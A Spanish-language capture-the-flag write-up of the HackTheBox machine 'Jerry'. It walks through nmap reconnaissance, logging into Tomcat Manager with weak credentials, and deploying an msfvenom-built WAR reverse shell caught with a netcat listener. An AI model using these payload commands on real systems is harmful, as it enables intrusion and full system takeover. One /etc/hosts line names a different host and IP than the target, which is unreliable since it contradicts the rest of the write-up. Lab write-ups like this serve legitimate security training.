# Jerry

![](../../../../~gitbook/image.md)Publicado: 09 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Jerry es una máquina Windows de dificultad fácil de HackTheBox que presenta un servidor Apache Tomcat 7.0.88 ejecutándose en el puerto 8080. La vulnerabilidad principal radica en el uso de credenciales débiles para acceder al panel de administración de Tomcat Manager. Una vez que se obtiene acceso al manager, es posible desplegar una aplicación web maliciosa (.war) que contiene una reverse shell, lo que permite obtener acceso completo al sistema como NT AUTHORITY\SYSTEM.Esta máquina es ideal para practicar conceptos fundamentales como el reconocimiento de servicios web, la explotación de credenciales por defecto, y el despliegue de payloads maliciosos en servidores de aplicaciones Java. Es una excelente introducción a las técnicas de post-explotación en entornos Windows corporativos.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### Escaneo de puertos TCP

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###### 🌐 Enumeración Web

#### 🚀 Puerto 8080 - Apache Tomcat 7.0.88
http://10.10.10.95:8080/![](../../../../~gitbook/image.md)Las credenciales por defecto `tomcat:admin` no funcionan.![](../../../../~gitbook/image.md)
Sin embargo probamos con las que aparecen en el banner de acceso denegado: `tomcat:s3cret`y ganamos acceso al manager:![](../../../../~gitbook/image.md)
### 🎯 Explotación

#### 💥 Despliegue de WAR malicioso
Dado que tenemos disponible el módulo para desplegar aplicaciones .war, usamos la herramienta msfvenom para generar una reverse shell usando un archivo malicioso con extensión .war:Subimos el .war y lo desplegamos:![](../../../../~gitbook/image.md)Verificamos que se ha desplegado correctamente nuestra aplicación maliciosa:![](../../../../~gitbook/image.md)Iniciamos un listener con netcatEjecutamos la aplicación y obtenemos la reverse shell obteniendo una sesión como NT Authority System:![](../../../../~gitbook/image.md)
#### 🏆 Post-Explotación
Obtenemos las flags en el directorio Desktop del usuario Administrator![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🎯 Explotación](#explotacion)

```
❯ ping -c2 10.10.10.95
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=43.6 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=127 time=43.6 ms

--- 10.10.10.95 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 43.602/43.609/43.617/0.007 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.95 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
8080
```

```
❯ nmap -sC -sV -p$ports 10.10.10.95 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 14:40 CEST
Nmap scan report for 10.10.10.95
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

```

```
echo "10.10.11.193 mentorquotes.htb" | sudo tee -a /etc/hosts
```

```
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f war -o rev.war
```

```
nc -nlvp 443
```
